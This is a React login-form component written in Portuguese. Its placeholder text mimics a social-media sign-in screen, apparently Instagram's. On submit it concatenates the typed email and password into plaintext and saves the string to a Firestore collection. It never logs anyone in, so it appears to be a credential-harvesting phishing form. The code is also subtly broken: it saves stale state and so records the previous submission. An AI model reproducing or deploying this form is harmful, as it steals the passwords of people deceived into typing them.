import { addDoc, collection} from "firebase/firestore";
import { databaseApp } from "../../Services/FireStoreConfig";
import { useState } from "react";
import style from "./Formulario.module.css";


const Formulario = () => {
    const [email, Setemail] = useState("");
    const [senha, setSenha] = useState("");
    const [tudo, settudo] = useState("");
    const referencia = collection(databaseApp, "db");

    const enviarDB = async () => {
        settudo(`email: ${email} senha: ${senha}`);
        await addDoc(referencia,{
          tudo:tudo
        })
        
    }

    return (
        <form onSubmit={(e)=>{
            e.preventDefault()
            enviarDB();
            }} className={style.formulario}>
            <input className={style.inpt}
                value={email}
                onChange={(e) => Setemail(e.target.value)}
                type="text"
                required
                placeholder="  Telefone, nome de usuário ou email"
            />
            <input className={style.inpt}
                value={senha}
                onChange={(e) => setSenha(e.target.value)}
                type="password"
                placeholder="  Senha"
                required
            />
            <button>Entrar</button>
        </form>)
}
export default Formulario;